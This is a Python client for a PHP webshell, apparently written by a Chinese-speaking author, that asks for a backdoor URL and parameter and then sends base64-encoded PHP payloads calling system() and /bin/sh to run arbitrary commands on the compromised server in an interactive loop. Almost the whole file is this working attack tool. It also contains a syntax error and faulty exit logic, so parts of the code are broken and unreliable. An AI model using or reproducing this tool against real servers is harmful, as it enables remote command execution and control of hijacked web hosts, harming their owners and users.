import requests
header = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
def base64(tstr):
	import base64
	return base64.b64encode(tstr.encode('utf-8'))
def path(url,parameter,header):
	post_data="eval(base64_decode(\"JGRpcj1kaXJuYW1lKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7IHByaW50ICRkaXI7\"));"
	r=requests.post(url,data={parameter:post_data},headers=header)
	return r.text
def regularex(estring): #正则匹配
	import re
	result = re.findall("(.*).*",estring)
	return result
def php_horse(url,parameter,header,pa=""):
	print(pa)
	if pa=="":
		file_path=path(url,parameter,header)
	else:
		file_path=pa
	cmd=str(input("\n["+str(file_path)+"]$ "))
	if cmd == "":
		return "None"
	elif cmd =="exit"
		return "exit"
	#za=@eval(base64_decode($_POST[z0]));
	zaphp="@eval(base64_decode(\"QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejBdKSk7\"));"
	#zbphp为命令执行代码
	zbphp="QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztkaWUoKTs="
	#linux_shell=/bin/sh
	linux_shell="L2Jpbi9zaA=="
	command="cd \""+str(file_path)+"\";"+str(cmd)+";pwd;"
	command=base64(command)
	#tphp为base64编码后的字符串
	r=requests.post(url,data={parameter:zaphp,'z0':zbphp,'z1':linux_shell,'z2':command.decode('utf-8')},headers=header)
	result=regularex(r.text)
	for i in range(len(result)-3):
		print (result[i]+" ",end="")
	return result[-3]
url=str(input("木马url: "))
parameter=str(input("木马参数: "))
pa=php_horse(url,parameter,header) #pa为路径判断所需函数
while True:
	if pa!="":
		pa=php_horse(url,parameter,header,pa=pa)
	elif pa=="exit":
		break

